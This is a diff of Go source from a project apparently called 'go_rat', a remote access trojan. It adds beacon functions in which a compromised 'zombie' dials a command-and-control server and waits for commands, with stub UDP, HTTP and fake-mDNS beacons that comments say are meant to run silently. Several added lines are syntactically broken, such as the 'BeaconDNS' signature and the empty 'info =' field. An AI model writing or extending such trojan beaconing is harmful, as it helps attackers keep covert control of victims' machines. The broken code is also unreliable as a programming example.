@@ -19,8 +19,6 @@ import (
 	/*/
 	"go_rat/pkg/shared_code"
 	"net"
-
-	"github.com/hashicorp/mdns"
 )
 
 // Beacons
@@ -38,9 +36,20 @@ func BaconTCP(zombie_ID string) {
 		shared_code.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
 		return
 	}
+	// now we just wait...
+	/// zombie should be dialing the home base expecting commands on connect
+	// assuming we coded the command and control to reply on connect and not just
+	// mark "we got one here" in some internal DB...
+	// why dont you try coding some behaviors for the command and control binary
+	// to enact on BEACON!
+	// TODO: code C&C to pool callbacks into a list
 	for {
-		netData, error := bufio.NewReader(connection).ReadString('\n')
-
+		netData, derp := bufio.NewReader(connection).ReadString('\n')
+		if derp != nil {
+			// print the error
+			shared_code.Error_printer(derp, "[-] Error: TCP Beacon Connection Threw some odd data our way and Failed")
+			return
+		}
 	}
 }
 
@@ -48,12 +57,18 @@ func BaconTCP(zombie_ID string) {
 func BeaconUDP() {
 
 }
+
+// we are going to make different HTTP requests to the Command Server in an ettempt to
+// silently
 func BeaconHTTP() {
 
 }
-func BeaconDNS() {
-	mdns.Config(mdns.Zone())
-	mdns.NewServer()
+
+func BeaconDNS(name ) {
+	MDNS_BEACON := shared_code.FakeMDNSService{
+		info = 
+	}
+	shared_code.StartMdnsReceiver(MDNS_BEACON)
 }
 
 /*
@@ -133,8 +148,11 @@ of f happens in the new goroutine.
 Goroutines run in the same address space, so access to shared memory must be synchronized
 /*/
 func main() {
-	if BEACON_ON_START == true {
-		switch BACON_TYPE {
+	// regardless of the beacon state, and anything else. I am going to instantiate a
+	// new CommandSet pool to handle anything we send later...
+	// we know where this zombie is... right?
+	if shared_code.BEACON_ON_START == true {
+		switch shared_code.BACON_TYPE {
 		case "tcp":
 			go BaconTCP()
 		case "udp":
